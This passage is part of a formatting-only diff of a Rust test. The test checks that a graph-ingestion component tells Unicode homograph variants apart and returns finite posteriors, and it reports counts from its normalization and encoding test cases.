                     100,
                     format!("homograph_evidence_{}_{}", set_idx, variant_idx),
                     format!("homograph_trace_{}", variant),
-                ).unwrap();
+                )
+                .unwrap();
 
                 if let Ok(posterior) = graph.ingest(&observation) {
                     // Track hash for collision detection
-                    let hash_key = (posterior.principal_id.clone(), posterior.evidence_hash.clone());
+                    let hash_key = (
+                        posterior.principal_id.clone(),
+                        posterior.evidence_hash.clone(),
+                    );
                     homograph_hashes.insert(hash_key, variant.to_string());
 
                     // Verify distinct handling of visually similar characters
-                    assert!(posterior.posterior.is_finite(),
-                        "Homograph variant '{}' should produce finite posterior", variant.escape_debug());
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Homograph variant '{}' should produce finite posterior",
+                        variant.escape_debug()
+                    );
                 }
             }
         }
 
         // Verify all homograph variants are treated as distinct
-        let unique_principals: std::collections::HashSet<String> = graph.posteriors()
+        let unique_principals: std::collections::HashSet<String> = graph
+            .posteriors()
             .iter()
             .filter(|p| p.principal_id.starts_with("homograph_principal_"))
             .map(|p| p.principal_id.clone())
             .collect();
 
         let total_homograph_variants: usize = homograph_sets.iter().map(|set| set.len()).sum();
-        assert!(unique_principals.len() >= total_homograph_variants - 5, // Allow some tolerance
-            "Should distinguish most homograph variants: {} >= {}", unique_principals.len(), total_homograph_variants - 5);
+        assert!(
+            unique_principals.len() >= total_homograph_variants - 5, // Allow some tolerance
+            "Should distinguish most homograph variants: {} >= {}",
+            unique_principals.len(),
+            total_homograph_variants - 5
+        );
 
-        println!("Unicode attack resistance test completed: {} normalization attacks, {} encoding tests, {} homograph variants",
-            unicode_normalization_attacks.len(), encoding_bypass_attacks.len(), total_homograph_variants);
+        println!(
+            "Unicode attack resistance test completed: {} normalization attacks, {} encoding tests, {} homograph variants",
+            unicode_normalization_attacks.len(),
+            encoding_bypass_attacks.len(),
+            total_homograph_variants
+        );
     }
 }
